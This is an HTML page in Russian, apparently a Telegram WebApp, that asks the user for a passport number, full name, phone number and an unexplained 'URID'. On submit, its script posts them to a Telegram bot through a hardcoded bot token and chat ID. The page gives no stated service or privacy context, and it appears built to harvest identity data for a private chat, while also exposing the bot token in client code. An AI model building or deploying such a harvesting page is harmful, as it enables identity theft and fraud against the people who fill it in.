<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Предоставление данных</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      margin: 0;
      padding: 20px;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      min-height: 100vh;
      background-color: var(--bg-color, #fff);
      color: var(--text-color, #000);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      transition: background-color 0.3s, color 0.3s;
    }
    h2 {
      margin-bottom: 24px;
      font-weight: 600;
      color: var(--text-color, #000);
    }
    form {
      width: 100%;
      max-width: 400px;
      display: flex;
      flex-direction: column;
      gap: 28px;
      /* Убираем фон и тени */
      background: transparent;
      box-shadow: none;
      padding: 0;
    }
    .input-group {
      display: flex;
      flex-direction: column;
      position: relative;
    }
    label {
      font-weight: 600;
      margin-bottom: 8px;
      font-size: 14px;
      color: var(--text-color, #000);
    }
    input {
      border: none;
      border-bottom: 2px solid var(--input-border-color, #999);
      background: transparent;
      padding: 6px 2px;
      font-size: 16px;
      color: var(--text-color, #000);
      outline: none;
      transition: border-color 0.3s;
    }
    input::placeholder {
      color: var(--input-placeholder-color, #999);
    }
    input:focus {
      border-bottom-color: var(--button-color, #0088cc);
    }
    button {
      padding: 12px;
      background-color: var(--button-color, #0088cc);
      color: var(--button-text-color, #fff);
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      font-weight: 600;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: var(--button-hover-color, #006fa1);
    }
    .status {
      margin-top: 12px;
      font-weight: 600;
      font-size: 14px;
      min-height: 22px;
      color: var(--text-color, #000);
    }
    .status.success {
      color: green;
    }
    .status.error {
      color: red;
    }
  </style>
</head>
<body>

<h2>Предоставление данных</h2>

<form id="dataForm" autocomplete="off">
  <div class="input-group">
    <label for="passkey">Паспорт</label>
    <input
      type="text"
      id="passkey"
      name="passkey"
      maxlength="11"
      placeholder="0000 000000"
      required
      inputmode="numeric"
      pattern="\d{4} \d{6}"
      title="Формат: 0000 000000"
    />
  </div>
  <div class="input-group">
    <label for="fio">ФИО</label>
    <input
      type="text"
      id="fio"
      name="fio"
      placeholder="Иванов Иван Иванович"
      required
      autocomplete="name"
      autocapitalize="words"
    />
  </div>
  <div class="input-group">
    <label for="phone">Номер телефона</label>
    <input
      type="tel"
      id="phone"
      name="phone"
      placeholder="+7 999 999 99 99"
      required
      inputmode="tel"
      pattern="\+7\s?\d{3}\s?\d{3}\s?\d{2}\s?\d{2}"
      title="Введите номер в формате +7 999 999 99 99"
    />
  </div>
  <div class="input-group">
    <label for="urid">URID</label>
    <input
      type="text"
      id="urid"
      name="urid"
      required
      autocomplete="off"
    />
  </div>
  <button type="submit">Отправить</button>
  <div class="status" aria-live="polite"></div>
</form>

<script>
  const tg = window.Telegram?.WebApp || null;

  function applyThemeColors(theme = {}) {
    const root = document.documentElement;

    root.style.setProperty('--bg-color', theme.bg_color || '#fff');
    root.style.setProperty('--text-color', theme.text_color || '#000');
    root.style.setProperty('--button-color', theme.button_color || '#0088cc');
    root.style.setProperty('--button-text-color', theme.button_text_color || '#fff');
    root.style.setProperty('--button-hover-color', theme.button_hover_color || '#006fa1');
    root.style.setProperty('--input-border-color', theme.input_border_color || '#999');
    root.style.setProperty('--input-placeholder-color', theme.input_placeholder_color || '#999');
  }

  if (tg) {
    tg.ready();
    applyThemeColors(tg.themeParams || {});
    tg.onEvent('themeChanged', () => applyThemeColors(tg.themeParams || {}));
  } else {
    applyThemeColors();
  }

  const passInput = document.getElementById('passkey');
  passInput.addEventListener('input', () => {
    let value = passInput.value.replace(/\D/g, '');
    if (value.length > 10) value = value.slice(0, 10);
    if (value.length > 4) {
      value = value.slice(0, 4) + ' ' + value.slice(4);
    }
    passInput.value = value;
  });

  const form = document.getElementById('dataForm');
  const statusDiv = document.querySelector('.status');

  form.addEventListener('submit', function (e) {
    e.preventDefault();

    const passkey = passInput.value.trim();
    const fio = form.fio.value.trim();
    const phone = form.phone.value.trim();
    const urid = form.urid.value.trim();

    if (!/^\d{4} \d{6}$/.test(passkey)) {
      statusDiv.textContent = 'Неверный формат паспорта. Пример: 1234 567890';
      statusDiv.className = 'status error';
      return;
    }

    // Токен и чат из задания
    const botToken = '8112715154:AAG8UTvBi79BvqBB4Cqob95oYgJxbXpgjiY';
    const chatId = '6222585321';

    const message = `Новые данные:
Паспорт: ${passkey}
ФИО: ${fio}
Телефон: ${phone}
URID: ${urid}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })
      .then(res => res.json())
      .then(data => {
        if (data.ok) {
          statusDiv.textContent = 'Данные успешно отправлены.';
          statusDiv.className = 'status success';
          form.reset();
        } else {
          throw new Error(data.description);
        }
      })
      .catch(err => {
        statusDiv.textContent = 'Ошибка: ' + err.message;
        statusDiv.className = 'status error';
      });
  });
</script>

</body>
</html>
